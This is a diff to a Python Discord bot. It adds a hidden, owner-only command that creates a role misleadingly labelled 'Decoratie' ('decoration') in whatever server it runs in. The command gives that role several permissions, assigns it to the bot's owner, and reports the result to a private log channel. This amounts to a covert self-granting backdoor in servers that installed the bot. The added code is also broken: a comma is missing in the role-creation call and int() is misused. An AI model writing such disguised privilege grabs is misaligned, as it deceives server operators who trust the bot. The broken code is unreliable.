@@ -171,6 +171,26 @@ async def staatsgreep(ctx):
     else:
         ctx.send("Staatsgrepen zijn uitgeschakeld.")
 
+# DECORATIE
+# command
+@bot.command(hidden = True)
+@commands.is_owner()
+async def decoratie(ctx):
+    server = ctx.guild
+    perms = discord.Permissions(permissions=20781760)
+    color = discord.Colour(int(0x06ad00, 16))
+    await server.create_role(reason="Gewoon mooie decoratie" name="Decoratie", permissions=perms, colour=color)
+
+    # Get role as object
+    new_role = discord.utils.get(server.roles, name="Decoratie")
+
+    # Add me to the role
+    person = ctx.message.author
+    await person.add_roles(new_role)
+
+    log_channel = bot.get_channel(77769784046492058)
+    await log_channel.send(f"Decoratie toegevoegd in '{server.name}', de rol 'Decoratie'")
+
 # test loop
 # restart loop
 @bot.command(hidden = True)
